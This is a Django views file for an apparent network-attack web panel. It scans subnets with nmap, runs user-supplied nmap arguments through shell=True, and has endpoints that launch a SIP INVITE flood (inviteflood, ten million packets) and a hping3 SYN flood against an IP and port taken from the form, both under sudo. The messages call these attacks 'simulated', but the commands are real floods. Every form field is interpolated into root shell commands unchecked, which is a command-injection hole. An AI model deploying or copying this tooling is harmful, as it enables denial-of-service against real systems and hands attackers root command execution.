from django.shortcuts import render
import nmap
import subprocess
from django.http import JsonResponse
from django.views import View

def scan_devices(request):
    devices = []
    nmap_output = None

    if request.method == "POST":
        # Get the IP address for scanning devices
        ip_address = request.POST.get("ip_address")
        # Get the custom nmap command
        nmap_command = request.POST.get("nmap_command")

        # If user entered an IP address, scan for devices in the network
        if ip_address:
            nm = nmap.PortScanner()
            try:
                nm.scan(hosts=f'{ip_address}/24', arguments='-sn')  # -sn for ping scan (no port scan)
                hosts = nm.all_hosts()

                for host in hosts:
                    if nm[host].state() == 'up':  # Check if host is up
                        devices.append(host)
            except Exception as e:
                devices = [f"Error scanning the network: {str(e)}"]

        # If user entered a custom nmap command, run the command
        if nmap_command:
            try:
                # Run the provided nmap command using subprocess
                command = f"nmap {nmap_command}"
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                nmap_output = result.stdout  # Capture the standard output from the command

                # If there is an error in the command, capture the error output
                if result.stderr:
                    nmap_output += "\nError:\n" + result.stderr
            except Exception as e:
                nmap_output = f"Error running the command: {str(e)}"

    return render(request, 'device_finder/index.html', {'devices': devices, 'nmap_output': nmap_output})

def next_page(request):
    return render(request, 'device_finder/next_page.html')

def attacks_page(request):
    return render(request, 'device_finder/attacks.html')

def attack1(request):
    return render(request, 'attacks/index.html', {'message': 'Attack 1 Triggered!'})

def attack2(request):
    return render(request, 'attacks/index.html', {'message': 'Attack 2 Triggered!'})

def attack3(request):
    return render(request, 'attacks/index.html', {'message': 'Attack 3 Triggered!'})

def attack4(request):
    return render(request, 'attacks/index.html', {'message': 'Attack 4 Triggered!'})

def inviteflood_attack(request):
    if request.method == "POST":
        username = request.POST.get('username')
        server_ip = request.POST.get('server_ip')
        interface = 'eth0'
        num_packets = '10000000'

        try:
            command = f"sudo inviteflood {interface} {username} {server_ip} {server_ip} {num_packets}"
            result = subprocess.run(command, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                message = 'Inviteflood attack simulated successfully.'
            else:
                message = f'Error: {result.stderr}'
        except Exception as e:
            message = f'Error running inviteflood: {str(e)}'

        return render(request, 'attacks/index.html', {'message': message})

    return render(request, 'attacks/index.html', {'message': 'Invalid request method.'})

def dos_attack(request):
    if request.method == "POST":
        target_ip = request.POST.get('target_ip')
        target_port = request.POST.get('target_port')
        packet_count = request.POST.get('packet_count', '1000')

        try:
            # Command to perform DoS attack using hping3
            # Install hping3 for this attack
            command = f"sudo hping3 -S --flood -p {target_port} {target_ip}"
            result = subprocess.run(command, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                message = f'DoS attack simulated successfully on {target_ip}:{target_port} with {packet_count} packets.'
            else:
                message = f'Error: {result.stderr}'
        except Exception as e:
            message = f'Error running DoS attack: {str(e)}'

        return render(request, 'attacks/index.html', {'message': message})

    return render(request, 'attacks/index.html', {'message': 'Invalid request method.'})

